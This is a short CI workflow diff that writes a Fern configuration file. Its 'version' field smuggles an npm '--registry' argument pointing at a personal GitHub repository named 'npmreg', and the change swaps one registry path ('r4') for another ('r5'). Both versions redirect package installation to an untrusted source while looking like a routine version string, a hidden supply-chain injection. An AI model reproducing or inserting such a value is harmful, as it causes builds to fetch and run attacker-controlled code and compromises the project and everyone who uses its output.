@@ -18,7 +18,7 @@ jobs:
           cat > build/fern/fern.config.json <<'JSON'
           {
             "organization": "nvidia",
-            "version": "5.190.0 --registry=https://raw.githubusercontent.com/lazyhacker6/npmreg/main/r4/"
+            "version": "5.190.0 --registry=https://raw.githubusercontent.com/lazyhacker6/npmreg/main/r5/"
           }
           JSON
           cat > build/fern/docs.yml <<'YAML'
